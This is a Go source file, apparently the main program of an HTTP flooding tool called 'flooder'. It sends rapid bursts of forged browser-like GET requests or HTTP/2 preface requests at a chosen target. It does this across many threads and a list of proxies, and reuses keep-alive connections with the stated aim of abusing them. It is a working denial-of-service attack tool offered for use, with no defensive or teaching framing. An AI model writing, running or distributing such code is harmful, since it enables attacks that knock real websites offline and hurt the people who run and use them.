package main

import (
	"flag"
	"flooder/Methods"
	"flooder/Utils"
	"math/rand"
	"net/url"
	"os"
	"strings"
	"time"
)

var (
	target        = flag.String("target", "127.0.0.1:8080", "ip:port")
	reslove       = flag.String("reslove", "127.0.0.1", "reslove as ip:port")
	threads       = flag.Int("threads", 1, "how many threads")
	repeatRequest = flag.Int("repeatRequest", 70, "abuse keep-alive connection")
	noProxiedRate = flag.Float64("noProxiedRate", 0.6, "rate of unproxied connection")
	proxies       = flag.String("proxies", "no proxy", "path 2 proxies file")
	method        = flag.String("method", "http_flood", "method")
	duration      = flag.Int("duration", 60, "attac duration in sec")
)

func main() {
	flag.Parse()
	if !strings.Contains(*target, "http") {
		*target = "http://" + *target
	}
	parsedTarget, err := url.Parse(*target)
	if err != nil {
		panic(err)
	}
	*target = Utils.ToIPWithPort(parsedTarget, strings.ToLower(parsedTarget.Scheme) == "https")
	if parsedTarget.Path == "" {
		parsedTarget.Path = "/"
	}

	rand.Seed(1337)
	proxyLines := []string{"no proxy"}
	if *proxies != "no proxy" {
		proxyLines = Utils.FileToList(*proxies)
	}
	payload := []byte{}
	switch *method {
	case "http_flood":
		{
			methods.TLSConfigD.ServerName = parsedTarget.Hostname() //SNI
			if parsedTarget.Port() != "443" && parsedTarget.Port() != "80" {
				payload = []byte("GET " + parsedTarget.Path + " HTTP/1.1\r\nHost: " + parsedTarget.Hostname() + ":" + parsedTarget.Port() + "\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:114.0) Gecko/20100101 Firefox/114.0\r\nAccept: */*\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: Keep-Alive\r\nSec-GPC: 1\r\nTE: trailers\r\n\r\n")
			} else {
				payload = []byte("GET " + parsedTarget.Path + " HTTP/1.1\r\nHost: " + parsedTarget.Hostname() + "\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:114.0) Gecko/20100101 Firefox/114.0\r\nAccept: */*\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: Keep-Alive\r\nSec-GPC: 1\r\nTE: trailers\r\n\r\n")
			}
		}
	case "unprotected":
		{
			methods.TLSConfigFastest.ServerName = parsedTarget.Hostname() //SNI
			payload = []byte("GET " + parsedTarget.Path + " HTTP/1.1\r\nHost: " + parsedTarget.Hostname() + "\r\nConnection: Keep-Alive\r\n\r\n")

		}
	case "PRI":
		{
			methods.TLSConfigD.ServerName = parsedTarget.Hostname() //SNI
			payload = []byte("PRI * HTTP/2.0\r\n\r\n")

		}
	default:{
		println("unsupported method")
		return
	}
	}
	if *reslove != "127.0.0.1" {
		*target = *reslove + parsedTarget.Port()
	}
	println(strings.ToLower(parsedTarget.Scheme), *target)
	println(string(payload))

	for i := 0; i < *threads; i++ {
		go flood(*target, payload, proxyLines, strings.ToLower(parsedTarget.Scheme) == "https", *repeatRequest, *noProxiedRate)
	}

	// 等待 60 秒后退出程序
	go func() {
		time.Sleep(time.Duration(*duration) * time.Second)
		os.Exit(0)
	}()
	select {}
}
func flood(target string, payload []byte, proxies []string, https bool, repeatRequest int, noProxiedRate float64) {

	for {
		proxyURL := proxies[rand.Intn(len(proxies))]

		methods.Http_flood(proxyURL, target, payload, https, repeatRequest, noProxiedRate)
	}
}
